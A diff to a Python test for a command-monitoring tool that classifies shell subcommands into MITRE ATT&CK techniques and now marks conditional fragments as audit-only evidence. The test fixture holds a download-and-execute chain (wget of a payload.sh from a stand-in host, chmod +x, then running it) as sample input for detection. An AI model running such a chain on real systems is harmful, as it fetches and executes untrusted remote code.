@@ -146,8 +146,11 @@ def test_session_monitor_records_ordered_subcommand_classifications():
 
     state = monitor.get_session("compound-1")
     assert state.commands == [command]
-    assert state.ttps == ["T1105", "T1222", "T1059"]
-    assert state.tactics == ["command-and-control", "defense-evasion", "execution"]
+    # Only the unconditional, trusted command mapping enters the observed
+    # session TTP set.  Conditional RHS fragments remain audit-only until
+    # their execution is independently observed.
+    assert state.ttps == ["T1105"]
+    assert state.tactics == ["command-and-control"]
     classified_commands = [
         event["command"]
         for event in state.classification_events
@@ -160,13 +163,22 @@ def test_session_monitor_records_ordered_subcommand_classifications():
     ]
     assert all(event.get("original_command") == command for event in state.classification_events)
     assert state.ttp_command_map["T1105"] == ["wget http://x/payload.sh -O /tmp/a"]
-    assert state.ttp_command_map["T1222"] == ["chmod +x /tmp/a"]
-    assert state.ttp_command_map["T1059"] == ["/tmp/a"]
+    assert "T1222" not in state.ttp_command_map
+    assert "T1059" not in state.ttp_command_map
     assert [event["source"] for event in state.classification_events] == [
         "rule",
         "rule",
         "rule",
     ]
+    assert [event["evidence_tier"] for event in state.classification_events] == [
+        "trusted_observation",
+        "audit_only_candidate",
+        "audit_only_candidate",
+    ]
+    assert all(
+        event.get("fragment_execution") == "conditional_unproven"
+        for event in state.classification_events[1:]
+    )
 
 
 if __name__ == "__main__":
